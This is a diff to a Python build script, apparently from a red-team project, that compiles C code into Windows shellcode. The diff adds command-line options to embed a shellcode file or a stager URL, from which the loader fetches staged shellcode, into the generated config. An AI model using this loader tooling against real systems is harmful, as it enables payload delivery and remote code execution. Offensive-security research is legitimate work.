@@ -3,13 +3,14 @@
 # Name  : c-to-shellcode.py
 # Author: Print3M
 # GitHub: https://github.com/Print3M
+import argparse
 import os
 from pathlib import Path
 import subprocess
 import sys
 
 
-def args(arr: list[str]):
+def join_args(arr: list[str]):
     return " ".join(arr)
 
 
@@ -21,7 +22,7 @@ def run_cmd(cmd: str):
 LOADER_PAYLOAD_STR = ":PAYLOAD:"
 
 CC = "x86_64-w64-mingw32-gcc-win32"
-EXE_PAYLOAD_CFLAGS = args([
+EXE_PAYLOAD_CFLAGS = join_args([
     "-fPIC",
     "-mconsole",
     "-Os",
@@ -31,7 +32,7 @@ EXE_PAYLOAD_CFLAGS = args([
     "-Wextra",
     "-Wformat",
 ])
-BIN_PAYLOAD_CFLAGS = args([
+BIN_PAYLOAD_CFLAGS = join_args([
     "-Os",
     "-fPIC",
     "-nostdlib",
@@ -47,10 +48,28 @@ BIN_PAYLOAD_CFLAGS = args([
 ])
 
 if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Shellcode/stager loader.")
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument('--shellcode-file', type=str, help='Path to shellcode file')
+    group.add_argument('--stager-url', type=str, help='URL to fetch staged shellcode from')
+
+    args = parser.parse_args()
+
     ORIG_CWD = Path(os.getcwd())
     ROOT = Path(__file__).parent
     input_file = Path(ROOT / 'payload.c').absolute()
     os.chdir(ROOT)
+
+    config = Path('assets/config.h').read_text()
+    if args.shellcode_file:
+        assert os.path.isfile(args.shellcode_file), f"Shellcode file '{args.shellcode_file}' does not exist."
+        config = config.replace('<SHELLCODE_HEX>', Path(args.shellcode_file).read_bytes().hex())
+    if args.stager_url:
+        config = config.replace('<STAGER_URL>', args.stager_url)
+        BIN_PAYLOAD_CFLAGS += ' -DSTAGED'
+        EXE_PAYLOAD_CFLAGS += ' -DSTAGED'
+    Path('bin/config.h').write_text(config)
+    
     output_dir = input_file.parent / 'bin'
     output_file_o = output_dir / f'{input_file.name.rsplit(".")[0]}.o'
     output_file_bin = output_dir / f'{input_file.name.rsplit(".")[0]}.bin'
